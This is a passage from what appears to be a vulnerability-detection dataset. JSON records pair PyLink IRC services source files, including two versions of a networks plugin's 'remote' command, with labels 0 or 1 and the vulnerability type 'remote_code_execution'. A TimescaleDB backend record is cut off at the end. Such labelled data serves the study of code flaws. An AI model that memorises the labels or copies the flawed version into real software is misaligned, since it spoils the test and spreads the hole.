True\n        return False\n\n    def isInternalServer(self, sid):\n        \"\"\"Returns whether the given SID is an internal PyLink server.\"\"\"\n        return (sid in self.servers and self.servers[sid].internal)\n\n    def getServer(self, numeric):\n        \"\"\"Finds the SID of the server a user is on.\"\"\"\n        userobj = self.users.get(numeric)\n        if userobj:\n            return userobj.server\n\n    def isManipulatableClient(self, uid):\n        \"\"\"\n        Returns whether the given user is marked as an internal, manipulatable\n        client. Usually, automatically spawned services clients should have this\n        set True to prevent interactions with opers (like mode changes) from\n        causing desyncs.\n        \"\"\"\n        return self.isInternalClient(uid) and self.users[uid].manipulatable\n\n    def getServiceBot(self, uid):\n        \"\"\"\n        Checks whether the given UID is a registered service bot. If True,\n        returns the cooresponding ServiceBot object.\n        \"\"\"\n        userobj = self.users.get(uid)\n        if not userobj:\n            return False\n\n        # Look for the \"service\" attribute in the IrcUser object, if one exists.\n        try:\n            sname = userobj.service\n            # Warn if the service name we fetched isn't a registered service.\n            if sname not in world.services.keys():\n                log.warning(\"(%s) User %s / %s had a service bot record to a service that doesn't \"\n                            \"exist (%s)!\", self.name, uid, userobj.nick, sname)\n            return world.services.get(sname)\n        except AttributeError:\n            return False\n\n    def getHostmask(self, user, realhost=False, ip=False):\n        \"\"\"\n        Returns the hostmask of the given user, if present. If the realhost option\n        is given, return the real host of the user instead of the displayed host.\n        If the ip option is given, return the IP address of the user (this overrides\n        realhost).\"\"\"\n        userobj = self.users.get(user)\n\n        try:\n            nick = userobj.nick\n        except AttributeError:\n            nick = '<unknown-nick>'\n\n        try:\n            ident = userobj.ident\n        except AttributeError:\n            ident = '<unknown-ident>'\n\n        try:\n            if ip:\n                host = userobj.ip\n            elif realhost:\n                host = userobj.realhost\n            else:\n                host = userobj.host\n        except AttributeError:\n            host = '<unknown-host>'\n\n        return '%s!%s@%s' % (nick, ident, host)\n\n    def getFriendlyName(self, entityid):\n        \"\"\"\n        Returns the friendly name of a SID or UID (server name for SIDs, nick for UID).\n        \"\"\"\n        if entityid in self.servers:\n            return self.servers[entityid].name\n        elif entityid in self.users:\n            return self.users[entityid].nick\n        else:\n            raise KeyError(\"Unknown UID/SID %s\" % entityid)\n\n    def getFullNetworkName(self):\n        \"\"\"\n        Returns the full network name (as defined by the \"netname\" option), or the\n        short network name if that isn't defined.\n        \"\"\"\n        return self.serverdata.get('netname', self.name)\n\n    def isOper(self, uid, allowAuthed=True, allowOper=True):\n        \"\"\"\n        Returns whether the given user has operator status on PyLink. This can be achieved\n        by either identifying to PyLink as admin (if allowAuthed is True),\n        or having user mode +o set (if allowOper is True). At least one of\n        allowAuthed or allowOper must be True for this to give any meaningful\n        results.\n        \"\"\"\n        if uid in self.users:\n            if allowOper and (\"o\", None) in self.users[uid].modes:\n                return True\n            elif allowAuthed and self.users[uid].account:\n                return True\n        return False\n\n    def checkAuthenticated(self, uid, allowAuthed=True, allowOper=True):\n        \"\"\"\n        Checks whether the given user has operator status on PyLink, raising\n        NotAuthorizedError and logging the access denial if not.\n        \"\"\"\n        log.warning(\"(%s) Irc.checkAuthenticated() is deprecated as of PyLink 1.2 and may be \"\n                    \"removed in a future relase. Consider migrating to the PyLink Permissions API.\",\n                    self.name)\n        lastfunc = inspect.stack()[1][3]\n        if not self.isOper(uid, allowAuthed=allowAuthed, allowOper=allowOper):\n            log.warning('(%s) Access denied for %s calling %r', self.name,\n                        self.getHostmask(uid), lastfunc)\n            raise utils.NotAuthorizedError(\"You are not authenticated!\")\n        return True\n\n    def matchHost(self, glob, target, ip=True, realhost=True):\n        \"\"\"\n        Checks whether the given host, or given UID's hostmask matches the given nick!user@host\n        glob.\n\n        If the target given is a UID, and the 'ip' or 'realhost' options are True, this will also\n        match against the target's IP address and real host, respectively.\n\n        This function respects IRC casemappings (rfc1459 and ascii). If the given target is a UID,\n        and the 'ip' option is enabled, the host portion of the glob is also matched as a CIDR\n        range.\n        \"\"\"\n        # Get the corresponding casemapping value used by ircmatch.\n        if self.proto.casemapping == 'rfc1459':\n            casemapping = 0\n        else:\n            casemapping = 1\n\n        # Try to convert target into a UID. If this fails, it's probably a hostname.\n        target = self.nickToUid(target) or target\n\n        # Prepare a list of hosts to check against.\n        if target in self.users:\n            if glob.startswith(('$', '!$')):\n                # !$exttarget inverts the given match.\n                invert = glob.startswith('!$')\n\n                # Exttargets start with $. Skip regular ban matching and find the matching ban handler.\n                glob = glob.lstrip('$!')\n                exttargetname = glob.split(':', 1)[0]\n                handler = world.exttarget_handlers.get(exttargetname)\n\n                if handler:\n                    # Handler exists. Return what it finds.\n                    result = handler(self, glob, target)\n                    log.debug('(%s) Got %s from exttarget %s in matchHost() glob $%s for target %s',\n                              self.name, result, exttargetname, glob, target)\n                    if invert:  # Anti-exttarget was specified.\n                        result = not result\n                    return result\n                else:\n                    log.debug('(%s) Unknown exttarget %s in matchHost() glob $%s', self.name,\n                              exttargetname, glob)\n                    return False\n\n            hosts = {self.getHostmask(target)}\n\n            if ip:\n                hosts.add(self.getHostmask(target, ip=True))\n\n                # HACK: support CIDR hosts in the hosts portion\n                try:\n                    header, cidrtarget = glob.split('@', 1)\n                    log.debug('(%s) Processing CIDRs for %s (full host: %s)', self.name,\n                              cidrtarget, glob)\n                    # Try to parse the host portion as a CIDR range\n                    network = ipaddress.ip_network(cidrtarget)\n\n                    log.debug('(%s) Found CIDR for %s, replacing target host with IP %s', self.name,\n                              realhost, target)\n                    real_ip = self.users[target].ip\n                    if ipaddress.ip_address(real_ip) in network:\n                        # If the CIDR matches, hack around the host matcher by pretending that\n                        # the lookup target was the IP and not the CIDR range!\n                        glob = '@'.join((header, real_ip))\n                except ValueError:\n                    pass\n\n            if realhost:\n                hosts.add(self.getHostmask(target, realhost=True))\n\n        else:  # We were given a host, use that.\n            hosts = [target]\n\n        # Iterate over the hosts to match using ircmatch.\n        for host in hosts:\n            if ircmatch.match(casemapping, glob, host):\n                return True\n\n        return False\n\nclass IrcUser():\n    \"\"\"PyLink IRC user class.\"\"\"\n    def __init__(self, nick, ts, uid, server, ident='null', host='null',\n                 realname='PyLink dummy client', realhost='null',\n                 ip='0.0.0.0', manipulatable=False, opertype='IRC Operator'):\n        self.nick = nick\n        self.ts = ts\n        self.uid = uid\n        self.ident = ident\n        self.host = host\n        self.realhost = realhost\n        self.ip = ip\n        self.realname = realname\n        self.modes = set()  # Tracks user modes\n        self.server = server\n\n        # Tracks PyLink identification status\n        self.account = ''\n\n        # Tracks oper type (for display only)\n        self.opertype = opertype\n\n        # Tracks external services identification status\n        self.services_account = ''\n\n        # Tracks channels the user is in\n        self.channels = set()\n\n        # Tracks away message status\n        self.away = ''\n\n        # This sets whether the client should be marked as manipulatable.\n        # Plugins like bots.py's commands should take caution against\n        # manipulating these \"protected\" clients, to prevent desyncs and such.\n        # For \"serious\" service clients, this should always be False.\n        self.manipulatable = manipulatable\n\n    def __repr__(self):\n        return 'IrcUser(%s/%s)' % (self.uid, self.nick)\n\nclass IrcServer():\n    \"\"\"PyLink IRC server class.\n\n    uplink: The SID of this IrcServer instance's uplink. This is set to None\n            for the main PyLink PseudoServer!\n    name: The name of the server.\n    internal: Whether the server is an internal PyLink PseudoServer.\n    \"\"\"\n\n    def __init__(self, uplink, name, internal=False, desc=\"(None given)\"):\n        self.uplink = uplink\n        self.users = set()\n        self.internal = internal\n        self.name = name.lower()\n        self.desc = desc\n\n    def __repr__(self):\n        return 'IrcServer(%s)' % self.name\n\nclass IrcChannel():\n    \"\"\"PyLink IRC channel class.\"\"\"\n    def __init__(self, name=None):\n        # Initialize variables, such as the topic, user list, TS, who's opped, etc.\n        self.users = set()\n        self.modes = set()\n        self.topic = ''\n        self.ts = int(time.time())\n        self.prefixmodes = {'op': set(), 'halfop': set(), 'voice': set(),\n                            'owner': set(), 'admin': set()}\n\n        # Determines whether a topic has been set here or not. Protocol modules\n        # should set this.\n        self.topicset = False\n\n        # Saves the channel name (may be useful to plugins, etc.)\n        self.name = name\n\n    def __repr__(self):\n        return 'IrcChannel(%s)' % self.name\n\n    def removeuser(self, target):\n        \"\"\"Removes a user from a channel.\"\"\"\n        for s in self.prefixmodes.values():\n            s.discard(target)\n        self.users.discard(target)\n\n    def deepcopy(self):\n        \"\"\"Returns a deep copy of the channel object.\"\"\"\n        return deepcopy(self)\n\n    def isVoice(self, uid):\n        \"\"\"Returns whether the given user is voice in the channel.\"\"\"\n        return uid in self.prefixmodes['voice']\n\n    def isHalfop(self, uid):\n        \"\"\"Returns whether the given user is halfop in the channel.\"\"\"\n        return uid in self.prefixmodes['halfop']\n\n    def isOp(self, uid):\n        \"\"\"Returns whether the given user is op in the channel.\"\"\"\n        return uid in self.prefixmodes['op']\n\n    def isAdmin(self, uid):\n        \"\"\"Returns whether the given user is admin (&) in the channel.\"\"\"\n        return uid in self.prefixmodes['admin']\n\n    def isOwner(self, uid):\n        \"\"\"Returns whether the given user is owner (~) in the channel.\"\"\"\n        return uid in self.prefixmodes['owner']\n\n    def isVoicePlus(self, uid):\n        \"\"\"Returns whether the given user is voice or above in the channel.\"\"\"\n        # If the user has any prefix mode, it has to be voice or greater.\n        return bool(self.getPrefixModes(uid))\n\n    def isHalfopPlus(self, uid):\n        \"\"\"Returns whether the given user is halfop or above in the channel.\"\"\"\n        for mode in ('halfop', 'op', 'admin', 'owner'):\n            if uid in self.prefixmodes[mode]:\n                return True\n        return False\n\n    def isOpPlus(self, uid):\n        \"\"\"Returns whether the given user is op or above in the channel.\"\"\"\n        for mode in ('op', 'admin', 'owner'):\n            if uid in self.prefixmodes[mode]:\n                return True\n        return False\n\n    @staticmethod\n    def sortPrefixes(key):\n        \"\"\"\n        Implements a sorted()-compatible sorter for prefix modes, giving each one a\n        numeric value.\n        \"\"\"\n        values = {'owner': 100, 'admin': 10, 'op': 5, 'halfop': 4, 'voice': 3}\n\n        # Default to highest value (1000) for unknown modes, should we choose to\n        # support them.\n        return values.get(key, 1000)\n\n    def getPrefixModes(self, uid, prefixmodes=None):\n        \"\"\"Returns a list of all named prefix modes the given user has in the channel.\n\n        Optionally, a prefixmodes argument can be given to look at an earlier state of\n        the channel's prefix modes mapping, e.g. for checking the op status of a mode\n        setter before their modes are processed and added to the channel state.\n        \"\"\"\n\n        if uid not in self.users:\n            raise KeyError(\"User %s does not exist or is not in the channel\" % uid)\n\n        result = []\n        prefixmodes = prefixmodes or self.prefixmodes\n\n        for mode, modelist in prefixmodes.items():\n            if uid in modelist:\n                result.append(mode)\n\n        return sorted(result, key=self.sortPrefixes)\n\nclass Protocol():\n    \"\"\"Base Protocol module class for PyLink.\"\"\"\n    def __init__(self, irc):\n        self.irc = irc\n        self.casemapping = 'rfc1459'\n        self.hook_map = {}\n\n        # Lock for updateTS to make sure only one thread can change the channel TS at one time.\n        self.ts_lock = threading.Lock()\n\n        # Lists required conf keys for the server block.\n        self.conf_keys = {'ip', 'port', 'hostname', 'sid', 'sidrange', 'protocol', 'sendpass',\n                          'recvpass'}\n\n        # Defines a set of PyLink protocol capabilities\n        self.protocol_caps = set()\n\n    def validateServerConf(self):\n        \"\"\"Validates that the server block given contains the required keys.\"\"\"\n        for k in self.conf_keys:\n            assert k in self.irc.serverdata, \"Missing option %r in server block for network %s.\" % (k, self.irc.name)\n\n        port = self.irc.serverdata['port']\n        assert type(port) == int and 0 < port < 65535, \"Invalid port %r for network %s\" % (port, self.irc.name)\n\n    @staticmethod\n    def parseArgs(args):\n        \"\"\"\n        Parses a string or list of of RFC1459-style arguments, where \":\" may\n        be used for multi-word arguments that last until the end of a line.\n        \"\"\"\n        if isinstance(args, str):\n            args = args.split(' ')\n\n        real_args = []\n        for idx, arg in enumerate(args):\n            if arg.startswith(':') and idx != 0:\n                # \":\" is used to begin multi-word arguments that last until the end of the message.\n                # Use list splicing here to join them into one argument, and then add it to our list of args.\n                joined_arg = ' '.join(args[idx:])[1:]  # Cut off the leading : as well\n                real_args.append(joined_arg)\n                break\n            real_args.append(arg)\n\n        return real_args\n\n    def hasCap(self, capab):\n        \"\"\"\n        Returns whether this protocol module instance has the requested capability.\n        \"\"\"\n        return capab.lower() in self.protocol_caps\n\n    def removeClient(self, numeric):\n        \"\"\"Internal function to remove a client from our internal state.\"\"\"\n        for c, v in self.irc.channels.copy().items():\n            v.removeuser(numeric)\n            # Clear empty non-permanent channels.\n            if not (self.irc.channels[c].users or ((self.irc.cmodes.get('permanent'), None) in self.irc.channels[c].modes)):\n                del self.irc.channels[c]\n            assert numeric not in v.users, \"IrcChannel's removeuser() is broken!\"\n\n        sid = self.irc.getServer(numeric)\n        log.debug('Removing client %s from self.irc.users', numeric)\n        del self.irc.users[numeric]\n        log.debug('Removing client %s from self.irc.servers[%s].users', numeric, sid)\n        self.irc.servers[sid].users.discard(numeric)\n\n    def updateTS(self, sender, channel, their_ts, modes=[]):\n        \"\"\"\n        Merges modes of a channel given the remote TS and a list of modes.\n        \"\"\"\n\n        # Okay, so the situation is that we have 6 possible TS/sender combinations:\n\n        #                       | our TS lower | TS equal | their TS lower\n        # mode origin is us     |   OVERWRITE  |   MERGE  |    IGNORE\n        # mode origin is uplink |    IGNORE    |   MERGE  |   OVERWRITE\n\n        def _clear():\n            log.debug(\"(%s) Clearing local modes from channel %s due to TS change\", self.irc.name,\n                      channel)\n            self.irc.channels[channel].modes.clear()\n            for p in self.irc.channels[channel].prefixmodes.values():\n                for user in p.copy():\n                    if not self.irc.isInternalClient(user):\n                        p.discard(user)\n\n        def _apply():\n            if modes:\n                log.debug(\"(%s) Applying modes on channel %s (TS ok)\", self.irc.name,\n                          channel)\n                self.irc.applyModes(channel, modes)\n\n        # Use a lock so only one thread can change a channel's TS at once: this prevents race\n        # conditions from desyncing the channel list.\n        with self.ts_lock:\n            our_ts = self.irc.channels[channel].ts\n            assert type(our_ts) == int, \"Wrong type for our_ts (expected int, got %s)\" % type(our_ts)\n            assert type(their_ts) == int, \"Wrong type for their_ts (expected int, got %s)\" % type(their_ts)\n\n            # Check if we're the mode sender based on the UID / SID given.\n            our_mode = self.irc.isInternalClient(sender) or self.irc.isInternalServer(sender)\n\n            log.debug(\"(%s/%s) our_ts: %s; their_ts: %s; is the mode origin us? %s\", self.irc.name,\n                      channel, our_ts, their_ts, our_mode)\n\n            if their_ts == our_ts:\n                log.debug(\"(%s/%s) remote TS of %s is equal to our %s; mode query %s\",\n                          self.irc.name, channel, their_ts, our_ts, modes)\n                # Their TS is equal to ours. Merge modes.\n                _apply()\n\n            elif (their_ts < our_ts):\n                if their_ts < 750000:\n                    log.warning('(%s) Possible desync? Not setting bogus TS %s on channel %s', self.irc.name, their_ts, channel)\n                else:\n                    log.debug('(%s) Resetting channel TS of %s from %s to %s (remote has lower TS)',\n                              self.irc.name, channel, our_ts, their_ts)\n                    self.irc.channels[channel].ts = their_ts\n\n                # Remote TS was lower and we're receiving modes. Clear the modelist and apply theirs.\n\n                _clear()\n                _apply()\n\n    def _getSid(self, sname):\n        \"\"\"Returns the SID of a server with the given name, if present.\"\"\"\n        name = sname.lower()\n        for k, v in self.irc.servers.items():\n            if v.name.lower() == name:\n                return k\n        else:\n            return sname  # Fall back to given text instead of None\n\n    def _getUid(self, target):\n        \"\"\"Converts a nick argument to its matching UID. This differs from irc.nickToUid()\n        in that it returns the original text instead of None, if no matching nick is found.\"\"\"\n        target = self.irc.nickToUid(target) or target\n        return target\n\n    @classmethod\n    def parsePrefixedArgs(cls, args):\n        \"\"\"Similar to parseArgs(), but stripping leading colons from the first argument\n        of a line (usually the sender field).\"\"\"\n        args = cls.parseArgs(args)\n        args[0] = args[0].split(':', 1)[1]\n        return args\n\n    def _squit(self, numeric, command, args):\n        \"\"\"Handles incoming SQUITs.\"\"\"\n\n        split_server = self._getSid(args[0])\n\n        # Normally we'd only need to check for our SID as the SQUIT target, but Nefarious\n        # actually uses the uplink server as the SQUIT target.\n        # <- ABAAE SQ nefarious.midnight.vpn 0 :test\n        if split_server in (self.irc.sid, self.irc.uplink):\n            raise ProtocolError('SQUIT received: (reason: %s)' % args[-1])\n\n        affected_users = []\n        affected_nicks = defaultdict(list)\n        log.debug('(%s) Splitting server %s (reason: %s)', self.irc.name, split_server, args[-1])\n\n        if split_server not in self.irc.servers:\n            log.warning(\"(%s) Tried to split a server (%s) that didn't exist!\", self.irc.name, split_server)\n            return\n\n        # Prevent RuntimeError: dictionary changed size during iteration\n        old_servers = self.irc.servers.copy()\n        old_channels = self.irc.channels.copy()\n\n        # Cycle through our list of servers. If any server's uplink is the one that is being SQUIT,\n        # remove them and all their users too.\n        for sid, data in old_servers.items():\n            if data.uplink == split_server:\n                log.debug('Server %s also hosts server %s, removing those users too...', split_server, sid)\n                # Recursively run SQUIT on any other hubs this server may have been connected to.\n                args = self._squit(sid, 'SQUIT', [sid, \"0\",\n                                   \"PyLink: Automatically splitting leaf servers of %s\" % sid])\n                affected_users += args['users']\n\n        for user in self.irc.servers[split_server].users.copy():\n            affected_users.append(user)\n            nick = self.irc.users[user].nick\n\n            # Nicks affected is channel specific for SQUIT:. This makes Clientbot's SQUIT relaying\n            # much easier to implement.\n            for name, cdata in old_channels.items():\n                if user in cdata.users:\n                    affected_nicks[name].append(nick)\n\n            log.debug('Removing client %s (%s)', user, nick)\n            self.removeClient(user)\n\n        serverdata = self.irc.servers[split_server]\n        sname = serverdata.name\n        uplink = serverdata.uplink\n\n        del self.irc.servers[split_server]\n        log.debug('(%s) Netsplit affected users: %s', self.irc.name, affected_users)\n\n        return {'target': split_server, 'users': affected_users, 'name': sname,\n                'uplink': uplink, 'nicks': affected_nicks, 'serverdata': serverdata,\n                'channeldata': old_channels}\n\n    @staticmethod\n    def parseCapabilities(args, fallback=''):\n        \"\"\"\n        Parses a string of capabilities in the 005 / RPL_ISUPPORT format.\n        \"\"\"\n\n        if type(args) == str:\n            args = args.split(' ')\n\n        caps = {}\n        for cap in args:\n            try:\n                # Try to split it as a KEY=VALUE pair.\n                key, value = cap.split('=', 1)\n            except ValueError:\n                key = cap\n                value = fallback\n            caps[key] = value\n\n        return caps\n\n    @staticmethod\n    def parsePrefixes(args):\n        \"\"\"\n        Separates prefixes field like \"(qaohv)~&@%+\" into a dict mapping mode characters to mode\n        prefixes.\n        \"\"\"\n        prefixsearch = re.search(r'\\(([A-Za-z]+)\\)(.*)', args)\n        return dict(zip(prefixsearch.group(1), prefixsearch.group(2)))\n\n    def handle_error(self, numeric, command, args):\n        \"\"\"Handles ERROR messages - these mean that our uplink has disconnected us!\"\"\"\n        raise ProtocolError('Received an ERROR, disconnecting!')\n/n/n/nplugins/networks.py/n/n\"\"\"Networks plugin - allows you to manipulate connections to various configured networks.\"\"\"\nimport importlib\nimport types\n\nfrom pylinkirc import utils, world, conf, classes\nfrom pylinkirc.log import log\nfrom pylinkirc.coremods import control, permissions\n\n@utils.add_cmd\ndef disconnect(irc, source, args):\n    \"\"\"<network>\n\n    Disconnects the network <network>. When all networks are disconnected, PyLink will automatically exit.\n\n    To reconnect a network disconnected using this command, use REHASH to reload the networks list.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.disconnect'])\n    try:\n        netname = args[0]\n        network = world.networkobjects[netname]\n    except IndexError:  # No argument given.\n        irc.error('Not enough arguments (needs 1: network name (case sensitive)).')\n        return\n    except KeyError:  # Unknown network.\n        irc.error('No such network \"%s\" (case sensitive).' % netname)\n        return\n    irc.reply(\"Done. If you want to reconnect this network, use the 'rehash' command.\")\n\n    control.remove_network(network)\n\n@utils.add_cmd\ndef autoconnect(irc, source, args):\n    \"\"\"<network> <seconds>\n\n    Sets the autoconnect time for <network> to <seconds>.\n    You can disable autoconnect for a network by setting <seconds> to a negative value.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.autoconnect'])\n    try:\n        netname = args[0]\n        seconds = float(args[1])\n        network = world.networkobjects[netname]\n    except IndexError:  # Arguments not given.\n        irc.error('Not enough arguments (needs 2: network name (case sensitive), autoconnect time (in seconds)).')\n        return\n    except KeyError:  # Unknown network.\n        irc.error('No such network \"%s\" (case sensitive).' % netname)\n        return\n    except ValueError:\n        irc.error('Invalid argument \"%s\" for <seconds>.' % seconds)\n        return\n    network.serverdata['autoconnect'] = seconds\n    irc.reply(\"Done.\")\n\nremote_parser = utils.IRCParser()\nremote_parser.add_argument('network')\nremote_parser.add_argument('--service', type=str, default='pylink')\nremote_parser.add_argument('command', nargs=utils.IRCParser.REMAINDER)\n@utils.add_cmd\ndef remote(irc, source, args):\n    \"\"\"<network> [--service <service name>] <command>\n\n    Runs <command> on the remote network <network>. Plugin responses sent using irc.reply() are\n    supported and returned here, but others are dropped due to protocol limitations.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.remote'])\n\n    args = remote_parser.parse_args(args)\n    netname = args.network\n\n    if netname == irc.name:\n        # This would actually throw _remote_reply() into a loop, so check for it here...\n        # XXX: properly fix this.\n        irc.error(\"Cannot remote-send a command to the local network; use a normal command!\")\n        return\n\n    try:\n        remoteirc = world.networkobjects[netname]\n    except KeyError:  # Unknown network.\n        irc.error('No such network \"%s\" (case sensitive).' % netname)\n        return\n\n    if args.service not in world.services:\n        irc.error('Unknown service %r.' % args.service)\n        return\n\n    # Force remoteirc.called_in to something private in order to prevent\n    # accidental information leakage from replies.\n    remoteirc.called_in = remoteirc.called_by = remoteirc.pseudoclient.uid\n\n    # Set the identification override to the caller's account.\n    remoteirc.pseudoclient.account = irc.users[source].account\n\n    def _remote_reply(placeholder_self, text, **kwargs):\n        \"\"\"\n        reply() rerouter for the 'remote' command.\n        \"\"\"\n        assert irc.name != placeholder_self.name, \\\n            \"Refusing to route reply back to the same \" \\\n            \"network, as this would cause a recursive loop\"\n        log.debug('(%s) networks.remote: re-routing reply %r from network %s', irc.name,\n                  text, placeholder_self.name)\n\n        # Override the source option to make sure the source is valid on the local network.\n        if 'source' in kwargs:\n            del kwargs['source']\n        irc.reply(text, source=irc.pseudoclient.uid, **kwargs)\n\n    old_reply = remoteirc._reply\n\n    with remoteirc.reply_lock:\n        try:  # Remotely call the command (use the PyLink client as a dummy user).\n            # Override the remote irc.reply() to send replies HERE.\n            log.debug('(%s) networks.remote: overriding reply() of IRC object %s', irc.name, netname)\n            remoteirc._reply = types.MethodType(_remote_reply, remoteirc)\n            world.services[args.service].call_cmd(remoteirc, remoteirc.pseudoclient.uid,\n                                                  ' '.join(args.command))\n        finally:\n            # Restore the original remoteirc.reply()\n            log.debug('(%s) networks.remote: restoring reply() of IRC object %s', irc.name, netname)\n            remoteirc._reply = old_reply\n            # Remove the identification override after we finish.\n            remoteirc.pseudoclient.account = ''\n\n@utils.add_cmd\ndef reloadproto(irc, source, args):\n    \"\"\"<protocol module name>\n\n    Reloads the given protocol module without restart. You will have to manually disconnect and reconnect any network using the module for changes to apply.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.reloadproto'])\n    try:\n        name = args[0]\n    except IndexError:\n        irc.error('Not enough arguments (needs 1: protocol module name)')\n        return\n\n    proto = utils.getProtocolModule(name)\n    importlib.reload(proto)\n\n    irc.reply(\"Done. You will have to manually disconnect and reconnect any network using the %r module for changes to apply.\" % name)\n/n/n/n", "label": 0, "vtype": "remote_code_execution"}, {"id": "9d9b01839cf3639e59d29c27e70688bdbf44db96", "code": "/plugins/networks.py/n/n\"\"\"Networks plugin - allows you to manipulate connections to various configured networks.\"\"\"\nimport importlib\nimport types\n\nfrom pylinkirc import utils, world, conf, classes\nfrom pylinkirc.log import log\nfrom pylinkirc.coremods import control, permissions\n\n@utils.add_cmd\ndef disconnect(irc, source, args):\n    \"\"\"<network>\n\n    Disconnects the network <network>. When all networks are disconnected, PyLink will automatically exit.\n\n    To reconnect a network disconnected using this command, use REHASH to reload the networks list.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.disconnect'])\n    try:\n        netname = args[0]\n        network = world.networkobjects[netname]\n    except IndexError:  # No argument given.\n        irc.error('Not enough arguments (needs 1: network name (case sensitive)).')\n        return\n    except KeyError:  # Unknown network.\n        irc.error('No such network \"%s\" (case sensitive).' % netname)\n        return\n    irc.reply(\"Done. If you want to reconnect this network, use the 'rehash' command.\")\n\n    control.remove_network(network)\n\n@utils.add_cmd\ndef autoconnect(irc, source, args):\n    \"\"\"<network> <seconds>\n\n    Sets the autoconnect time for <network> to <seconds>.\n    You can disable autoconnect for a network by setting <seconds> to a negative value.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.autoconnect'])\n    try:\n        netname = args[0]\n        seconds = float(args[1])\n        network = world.networkobjects[netname]\n    except IndexError:  # Arguments not given.\n        irc.error('Not enough arguments (needs 2: network name (case sensitive), autoconnect time (in seconds)).')\n        return\n    except KeyError:  # Unknown network.\n        irc.error('No such network \"%s\" (case sensitive).' % netname)\n        return\n    except ValueError:\n        irc.error('Invalid argument \"%s\" for <seconds>.' % seconds)\n        return\n    network.serverdata['autoconnect'] = seconds\n    irc.reply(\"Done.\")\n\nremote_parser = utils.IRCParser()\nremote_parser.add_argument('network')\nremote_parser.add_argument('--service', type=str, default='pylink')\nremote_parser.add_argument('command', nargs=utils.IRCParser.REMAINDER)\n@utils.add_cmd\ndef remote(irc, source, args):\n    \"\"\"<network> [--service <service name>] <command>\n\n    Runs <command> on the remote network <network>. Plugin responses sent using irc.reply() are\n    supported and returned here, but others are dropped due to protocol limitations.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.remote'])\n\n    args = remote_parser.parse_args(args)\n    netname = args.network\n\n    if netname == irc.name:\n        # This would actually throw _remote_reply() into a loop, so check for it here...\n        # XXX: properly fix this.\n        irc.error(\"Cannot remote-send a command to the local network; use a normal command!\")\n        return\n\n    try:\n        remoteirc = world.networkobjects[netname]\n    except KeyError:  # Unknown network.\n        irc.error('No such network \"%s\" (case sensitive).' % netname)\n        return\n\n    if args.service not in world.services:\n        irc.error('Unknown service %r.' % args.service)\n        return\n\n    # Force remoteirc.called_in to something private in order to prevent\n    # accidental information leakage from replies.\n    remoteirc.called_in = remoteirc.called_by = remoteirc.pseudoclient.uid\n\n    # Set the identification override to the caller's account.\n    remoteirc.pseudoclient.account = irc.users[source].account\n\n    def _remote_reply(placeholder_self, text, **kwargs):\n        \"\"\"\n        reply() rerouter for the 'remote' command.\n        \"\"\"\n        assert irc.name != placeholder_self.name, \\\n            \"Refusing to route reply back to the same \" \\\n            \"network, as this would cause a recursive loop\"\n        log.debug('(%s) networks.remote: re-routing reply %r from network %s', irc.name,\n                  text, placeholder_self.name)\n\n        # Override the source option to make sure the source is valid on the local network.\n        if 'source' in kwargs:\n            del kwargs['source']\n        irc.reply(text, source=irc.pseudoclient.uid, **kwargs)\n\n    old_reply = remoteirc.reply\n\n    with remoteirc.reply_lock:\n        try:  # Remotely call the command (use the PyLink client as a dummy user).\n            # Override the remote irc.reply() to send replies HERE.\n            log.debug('(%s) networks.remote: overriding reply() of IRC object %s', irc.name, netname)\n            remoteirc.reply = types.MethodType(_remote_reply, remoteirc)\n            world.services[args.service].call_cmd(remoteirc, remoteirc.pseudoclient.uid,\n                                                  ' '.join(args.command))\n        finally:\n            # Restore the original remoteirc.reply()\n            log.debug('(%s) networks.remote: restoring reply() of IRC object %s', irc.name, netname)\n            remoteirc.reply = old_reply\n            # Remove the identification override after we finish.\n            remoteirc.pseudoclient.account = ''\n\n@utils.add_cmd\ndef reloadproto(irc, source, args):\n    \"\"\"<protocol module name>\n\n    Reloads the given protocol module without restart. You will have to manually disconnect and reconnect any network using the module for changes to apply.\"\"\"\n    permissions.checkPermissions(irc, source, ['networks.reloadproto'])\n    try:\n        name = args[0]\n    except IndexError:\n        irc.error('Not enough arguments (needs 1: protocol module name)')\n        return\n\n    proto = utils.getProtocolModule(name)\n    importlib.reload(proto)\n\n    irc.reply(\"Done. You will have to manually disconnect and reconnect any network using the %r module for changes to apply.\" % name)\n/n/n/n", "label": 1, "vtype": "remote_code_execution"}, {"id": "ef6a4d5639653ecfe27fd2335752fc98e7352075", "code": "gfui/backends/Timescaledb/timescaledb.py/n/nfrom gfui.backends.default import Backend\nimport psycopg2\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Timescaledb_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = psycopg2.connect(\n            \"dbname={0} user={1} password={2} host={3}\".format(\n                self.OPTIONS['SQL_DB'],\n                self.OPTIONS['SQL_USERNAME'],\n                pw,\n                self.OPTIONS['SQL_SERVER']\n            )\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = self.schema.query(db, FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name 